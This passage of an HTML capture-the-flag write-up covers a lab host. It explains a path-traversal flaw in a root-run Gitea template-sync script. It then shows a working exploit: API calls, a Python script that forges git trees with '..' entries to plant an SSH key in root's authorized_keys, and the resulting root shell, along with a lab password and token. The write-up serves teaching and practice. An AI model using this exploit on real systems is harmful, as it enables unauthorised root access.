+import sys
+import json
+import subprocess
+import time
+import urllib.request
+ 
+GITEA_URL = "http://localhost:3000"
+REPO_ROOT = "/var/lib/gitea/data/gitea-repositories"
+STAGING_DIR = "/home/git/template-staging"
+LOG_FILE = "/var/log/template-sync.log"
+ 
+def log(msg):
+    ts = time.strftime("%Y-%m-%d %H:%M:%S")
+    line = "[%s] %s" % (ts, msg)
+    print(line, flush=True)
+    try:
+        os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
+        with open(LOG_FILE, 'a') as f:
+            f.write(line + '\n')
+    except:
+        pass
+ 
+def load_config():
+    config = {}
+    for path in ['/etc/gitea/template-sync.conf', '/opt/forge/app/.env']:
+        try:
+            with open(path) as f:
+                for line in f:
+                    line = line.strip()
+                    if line and not line.startswith('#') and '=' in line:
+                        k, v = line.split('=', 1)
+                        config[k.strip()] = v.strip()
+        except:
+            pass
+    return config
+ 
+def get_token():
+    cfg = load_config()
+    return cfg.get('GITEA_API_TOKEN')
+ 
+def get_template_repos(token):
+    url = "%s/api/v1/repos/search?limit=50" % GITEA_URL
+    req = urllib.request.Request(url, headers={
+        'Authorization': 'token %s' % token
+    })
+    try:
+        with urllib.request.urlopen(req) as resp:
+            data = json.loads(resp.read())
+            repos = data.get('data', data) if isinstance(data, dict) else data
+            return [r for r in repos if r.get('template', False)]
+    except Exception as e:
+        log("API error: %s" % e)
+        return []
+ 
+def sync_template(repo_info):
+    owner = repo_info['owner']['login']
+    name = repo_info['name'].lower()
+    bare_path = os.path.join(REPO_ROOT, owner, "%s.git" % name)
+    stage_path = os.path.join(STAGING_DIR, owner, name)
+ 
+    if not os.path.isdir(bare_path):
+        log("  repo not found: %s" % bare_path)
+        return
+ 
+    # Read tree entries from the bare repository
+    try:
+        GIT = ['git', '-c', 'safe.directory=*']
+        result = subprocess.run(
+            GIT + ['ls-tree', '-r', 'HEAD'],
+            cwd=bare_path,
+            capture_output=True, text=True, timeout=10
+        )
+        if result.returncode != 0:
+            log("  ls-tree failed: %s" % result.stderr.strip())
+            return
+    except Exception as e:
+        log("  ls-tree error: %s" % e)
+        return
+ 
+    entries = []
+    for line in result.stdout.strip().split('\n'):
+        if not line:
+            continue
+        parts = line.split('\t', 1)
+        if len(parts) != 2:
+            continue
+        meta, filepath = parts
+        mode, objtype, objhash = meta.split()
+        if objtype == 'blob':
+            entries.append((mode, objhash, filepath))
+ 
+    if not entries:
+        log("  no files in template")
+        return
+ 
+    # Extract files to staging directory
+    for mode, objhash, filepath in entries:
+        target = os.path.join(stage_path, filepath)
+        target_dir = os.path.dirname(target)
+ 
+        try:
+            os.makedirs(target_dir, exist_ok=True)
+            GIT = ['git', '-c', 'safe.directory=*']
+            cat_result = subprocess.run(
+                GIT + ['cat-file', 'blob', objhash],
+                cwd=bare_path,
+                capture_output=True, timeout=10
+            )
+            if cat_result.returncode != 0:
+                continue
+ 
+            with open(target, 'wb') as f:
+                f.write(cat_result.stdout)
+ 
+            if mode == '100755':
+                os.chmod(target, 0o755)
+            else:
+                os.chmod(target, 0o644)
+ 
+            log("  synced: %s" % filepath)
+        except Exception as e:
+            log("  error syncing %s: %s" % (filepath, e))
+ 
+def main():
+    log("Template sync starting")
+ 
+    token = get_token()
+    if not token:
+        log("No API token found")
+        sys.exit(1)
+ 
+    templates = get_template_repos(token)
+    log("Found %d template repo(s)" % len(templates))
+ 
+    for repo in templates:
+        name = repo['full_name']
+        log("Syncing template: %s" % name)
+        sync_template(repo)
+ 
+    log("Template sync complete")
+ 
+if __name__ == '__main__':
+    main()</div>
+ 
+<p>This is where an important point emphasized by many cybersecurity professionals comes into play: having a solid understanding of programming is essential. It allows us to read and understand scripts, identify insecure logic, and recognize potential security vulnerabilities</p>
+ 
+<div class="impact-highlights-warning">
+<p>💡 Reviewing the script reveals basic Python libraries like <code>subprocess</code> for Git commands and <code>urllib</code> to communicate with the Gitea API</p>
+<p>The primary job of the script is iterating through repositories marked as templates and placing copies into the staging directory</p>
+<p>The critical logic lives inside the sync template function</p>
+<p>The script executes <code>git ls-tree</code> to fetch all file paths inside the repository</p>
+<p>Then it constructs destination paths like this:</p>
+<div class="terminal-box">target = os path join stage path filepath</div>
+<p><strong>Root Cause Analysis</strong></p>
+<p>The script trusts the filepath retrieved from Git without any path sanitization</p>
+<p>The <code>os.path.join</code> function allows path traversal sequences like <code>../</code> to break out of the staging directory</p>
+<p>Since the service executes with full root permissions an attacker gains complete filesystem access</p>
+<p>An attacker creates a malicious template repository with payload file paths targeting system files like SSH authorized keys</p>
+<p>When the synchronization service runs it executes <code>git cat-file</code> and writes the payload to arbitrary system paths</p>
+<p><strong>Exploit Flow</strong></p>
+</div>
+ 
+<div class="tree-box">Gitea Template Repository —→ Path Traversal File Name —→ Arbitrary File Write as Root —→ Full System Compromise</div>
+ 
+<div class="impact-highlights-warning">
+<p>💡 The following security vulnerabilities were identified:</p>
+<ul>
+<li><strong>Path Traversal:</strong> The file path is not properly validated.</li>
+<li><strong>Insufficient Input Sanitization:</strong> The application allows the use of <code>../</code> path traversal sequences.</li>
+<li><strong>Execution with Root Privileges:</strong> The script runs with root privileges, potentially allowing full system compromise.</li>
+<li><strong>No Rate Limiting:</strong> The functionality can be triggered repeatedly without any apparent rate-limiting mechanism.</li>
+</ul>
+</div>
+ 
+<p>Now we will attempt to exploit this vulnerability to escalate our privileges to root</p>
+ 
+<p>Next we will generate an SSH key pair and use it as part of the privilege escalation process</p>
+ 
+<div class="terminal-box"> jones@nexus:~$ ssh-keygen -t ed25519 -f /tmp/.k -N ""
+Generating public/private ed25519 key pair.
+Your identification has been saved in /tmp/.k
+Your public key has been saved in /tmp/.k.pub
+The key fingerprint is:
+SHA256:62SGKi2gQWZpBgJNAcphgx2WfAMYq6269WqV85Ahh2Y jones@nexus
+The key's randomart image is:
++--[ED25519 256]--+
+|*%*=             |
+|OoB o            |
+|=..o .           |
+|.OE o            |
+|Bo.o +  S        |
+|o.  *  . .       |
+|oo.o +. =        |
+|o.+....=         |
+|oo.+o   .        |
++----[SHA256]-----+</div>
+ 
+<p>We generated an SSH key pair in <code>/tmp</code>, which produced two keys: a <strong>public key</strong> and a <strong>private key</strong></p>
+ 
+<p>Our goal is to add the public key to <code>~/.ssh/authorized_keys</code>, allowing us to authenticate to the account using the corresponding private key</p>
+ 
+<p>From this point onward, we will interact with the Git repositories using an authentication token instead of an email and password</p>
+ 
+<div class="terminal-box">jones@nexus:/tmp$ curl -X POST http://localhost:3000/api/v1/users/jones/tokens \
+  -H "Content-Type: application/json" \
+  -u 'jones:y27xb3ha!!74GbR' \
+  -d '{"name":"exploit_token","scopes":["write:repository"]}'</div>
+ 
+<div class="terminal-box">TOKEN="35f78ffe03719548d26616b0a0bd2b30b5175f45"</div>
+ 
+<p>At this point, we have obtained the authentication token associated with the <code>jones</code> user</p>
+ 
+<p>Next, we will create a new repository using the authentication token associated with the <code>jones</code> user</p>
+ 
+<div class="terminal-box">jones@nexus:/tmp$ curl -X POST http://localhost:3000/api/v1/user/repos \
+  -H "Authorization: token $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"name":"rce","private":false}'
+{"id":2,"owner":{"id":2,"login":"jones","login_name":"","source_id":0,"full_name":"","email":"j.matthew@nexus.htb","avatar_url":"http://localhost:3000/avatars/44605a9b14edc9ec7346f4958bf4c383","html_url":"http://localhost:3000/jones","language":"","is_admin":false,"last_login":"0001-01-01T00:00:00Z","created":"2026-05-11T16:45:25Z","restricted":false,"active":false,"prohibit_login":false,"location":"","website":"","description":"","visibility":"public","followers_count":0,"following_count":0,"starred_repos_count":0,"username":"jones"},"name":"rce","full_name":"jones/rce","description":"","empty":true,"private":false,"fork":false,"template":false,"mirror":false,"size":27,"language":"","languages_url":"http://git.nexus.htb/api/v1/repos/jones/rce/languages","html_url":"http://localhost:3000/jones/rce","url":"http://git.nexus.htb/api/v1/repos/jones/rce","link":"","ssh_url":"git@git.nexus.htb:jones/rce.git","clone_url":"http://localhost:3000/jones/rce.git","original_url":"","website":"","stars_count":0,"forks_count":0,"watchers_count":1,"branch_count":0,"open_issues_count":0,"open_pr_counter":0,"release_counter":0,"default_branch":"main","archived":false,"created_at":"2026-09-02T12:05:47Z","updated_at":"2026-09-02T12:05:48Z","archived_at":"1970-01-01T00:00:00Z","permissions":{"admin":true,"push":true,"pull":true},"has_code":true,"has_issues":true,"internal_tracker":{"enable_time_tracker":true,"allow_only_contributors_to_track_time":true,"enable_issue_dependencies":true},"has_wiki":true,"has_pull_requests":true,"has_projects":true,"projects_mode":"all","has_releases":true,"has_packages":true,"has_actions":true,"ignore_whitespace_conflicts":false,"allow_merge_commits":true,"allow_rebase":true,"allow_rebase_explicit":true,"allow_squash_merge":true,"allow_fast_forward_only_merge":true,"allow_rebase_update":true,"allow_manual_merge":false,"autodetect_manual_merge":false,"default_delete_branch_after_merge":false,"default_merge_style":"merge","default_allow_maintainer_edit":true,"avatar_url":"","internal":false,"mirror_interval":"","object_format_name":"sha1","mirror_updated":"0001-01-01T00:00:00Z","topics":[],"licenses":[]}</div>
+ 
+<p>At this point, we need to make sure that the repository template option is enabled by setting <code>template</code> to <code>true</code></p>
+ 
+<div class="terminal-box">curl -X PATCH http://localhost:3000/api/v1/repos/jones/rce \
+  -H "Authorization: token $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"template":true}'
+{"id":2,"owner":{"id":2,"login":"jones","login_name":"","source_id":0,"full_name":"","email":"j.matthew@nexus.htb","avatar_url":"http://localhost:3000/avatars/44605a9b14edc9ec7346f4958bf4c383","html_url":"http://localhost:3000/jones","language":"","is_admin":false,"last_login":"0001-01-01T00:00:00Z","created":"2026-05-11T16:45:25Z","restricted":false,"active":false,"prohibit_login":false,"location":"","website":"","description":"","visibility":"public","followers_count":0,"following_count":0,"starred_repos_count":0,"username":"jones"},"name":"rce","full_name":"jones/rce","description":"","empty":true,"private":false,"fork":false,"template":true,"mirror":false,"size":27,"language":"","languages_url":"http://git.nexus.htb/api/v1/repos/jones/rce/languages","html_url":"http://localhost:3000/jones/rce","url":"http://git.nexus.htb/api/v1/repos/jones/rce","link":"","ssh_url":"git@git.nexus.htb:jones/rce.git","clone_url":"http://localhost:3000/jones/rce.git","original_url":"","website":"","stars_count":0,"forks_count":0,"watchers_count":1,"branch_count":0,"open_issues_count":0,"open_pr_counter":0,"release_counter":0,"default_branch":"main","archived":false,"created_at":"2026-09-02T12:05:47Z","updated_at":"2026-09-02T12:05:48Z","archived_at":"1970-01-01T00:00:00Z","permissions":{"admin":true,"push":true,"pull":true},"has_code":true,"has_issues":true,"internal_tracker":{"enable_time_tracker":true,"allow_only_contributors_to_track_time":true,"enable_issue_dependencies":true},"has_wiki":true,"has_pull_requests":true,"has_projects":true,"projects_mode":"all","has_releases":true,"has_packages":true,"has_actions":true,"ignore_whitespace_conflicts":false,"allow_merge_commits":true,"allow_rebase":true,"allow_rebase_explicit":true,"allow_squash_merge":true,"allow_fast_forward_only_merge":true,"allow_rebase_update":true,"allow_manual_merge":false,"autodetect_manual_merge":false,"default_delete_branch_after_merge":false,"default_merge_style":"merge","default_allow_maintainer_edit":true,"avatar_url":"","internal":false,"mirror_interval":"","object_format_name":"sha1","mirror_updated":"0001-01-01T00:00:00Z","topics":[],"licenses":[]}</div>
+ 
+<p>At this point, we have successfully created the repository and enabled the template option</p>
+ 
+<div class="impact-highlights-warning">
+<p>💡 I found a Python script that manually creates Git <code>blob</code>, <code>tree</code>, and <code>commit</code> objects instead of following the standard Git workflow.</p>
+<p>The script reads the generated SSH public key and stores it as a Git blob. It then creates a custom Git tree containing <code>.ssh/authorized_keys</code>. To exploit the identified path traversal vulnerability, the script inserts multiple <code>..</code> path components into the Git tree.</p>
+<p>Finally, it creates a commit pointing to the malicious tree and sets it as the <code>main</code> branch. After pushing the repository to Gitea, the root-owned template synchronization service processes these Git paths, allowing the path traversal vulnerability to be triggered in a privileged context.</p>
+</div>
+ 
+<div class="terminal-box">#!/usr/bin/env python3
+import hashlib,zlib,os,subprocess,sys,time
+ 
+def write_obj(data,t):
+    h=("%s %d"%(t,len(data))).encode()+b"\x00"
+    s=h+data
+    sha=hashlib.sha1(s).hexdigest()
+    d=os.path.join(".git","objects",sha[:2])
+    os.makedirs(d,exist_ok=True)
+    p=os.path.join(d,sha[2:])
+    if not os.path.exists(p):
+        open(p,"wb").write(zlib.compress(s))
+    return sha
+ 
+def entry(mode,name,sha):
+    return("%s %s"%(mode,name)).encode()+b"\x00"+bytes.fromhex(sha)
+ 
+if not os.path.isdir(".git"):
+    print("Run inside git repo");sys.exit(1)
+ 
+r=subprocess.run(["cat","/tmp/.k.pub"],capture_output=True,text=True)
+if r.returncode!=0:
+    print("ssh-keygen -t ed25519 -f /tmp/.k -N ''");sys.exit(1)
+key=r.stdout.strip()+"\n"
+ 
+blob=write_obj(key.encode(),"blob")
+readme=write_obj(b"# Template\n","blob")
+ssh_t=write_obj(entry("100644","authorized_keys",blob),"tree")
+cur=write_obj(entry("40000",".ssh",ssh_t),"tree")
+fir=write_obj(entry("40000","root",cur),"tree")
+for i in range(4):
+    fir=write_obj(entry("40000","..",fir),"tree")
+root=write_obj(entry("100644","README.md",readme)+entry("40000","..",fir),"tree")
+ts=int(time.time())
+c="tree %s\nauthor x <x@x> %d +0000\ncommitter x <x@x> %d +0000\n\ninit\n"%(root,ts,ts)
+sha=write_obj(c.encode(),"commit")
+os.makedirs(os.path.join(".git","refs","heads"),exist_ok=True)
+open(os.path.join(".git","refs","heads","main"),"w").write(sha+"\n")
+print("Done: "+sha)</div>
+ 
+<p>We executed the Python script, and it completed successfully:</p>
+ 
+<div class="terminal-box">jones@nexus:/tmp/rce$ python3 /tmp/py.py
+Done: 73a41855eac106acbac898688011f0eb33e5606a</div>
+ 
+<p>The script successfully created the malicious Git objects and returned the resulting commit hash.</p>
+ 
+<p>We then pushed the <code>main</code> branch from the local repository to Gitea.</p>
+ 
+<div class="terminal-box">jones@nexus:/tmp/rce$ git push -u origin main
+Username for 'http://localhost:3000': jones
+Password for 'http://jones@localhost:3000':
+warning: unable to access '../../../../../root/.gitattributes': Permission denied
+warning: unable to access '../../../../../root/.ssh/.gitattributes': Permission denied
+Enumerating objects: 11, done.
+Counting objects: 100% (11/11), done.
+Delta compression using up to 2 threads
+Compressing objects: 100% (3/3), done.
+Writing objects: 100% (11/11), 612 bytes | 612.00 KiB/s, done.
+Total 11 (delta 0), reused 0 (delta 0), pack-reused 0
+remote: . Processing 1 references
+remote: Processed 1 references in total
+To http://localhost:3000/jones/rce.git
+ * [new branch]      main -> main
+branch 'main' set up to track 'origin/main'</div>
+ 
+<p>Now, we will use the SSH key that should have been added successfully to authenticate to the target system and obtain a root shell.</p>
+ 
+<div class="terminal-box">jones@nexus:/tmp/rce$ ssh -i /tmp/.k root@10.129.111.163
+Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-111-generic x86_64)
+ 
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+ 
+ System information as of Wed Sep  2 12:42:56 PM UTC 2026
+ 
+  System load:           0.03
+  Usage of /:            66.6% of 6.48GB
+  Memory usage:          18%
+  Swap usage:            0%
+  Processes:             230
+  Users logged in:       1
+  IPv4 address for eth0: 10.129.111.163
+  IPv6 address for eth0: dead:beef::a0de:adff:fea8:cb00
+ 
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+ 
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+ 
+Expanded Security Maintenance for Applications is not enabled.
+ 
+1 update can be applied immediately.
+To see these additional updates run: apt list --upgradable
+ 
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+ 
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+ 
+root@nexus:~# id
+uid=0(root) gid=0(root) groups=0(root)</div>
+ 
+</div>
+</article>
+</div>
+</body>
+</html>
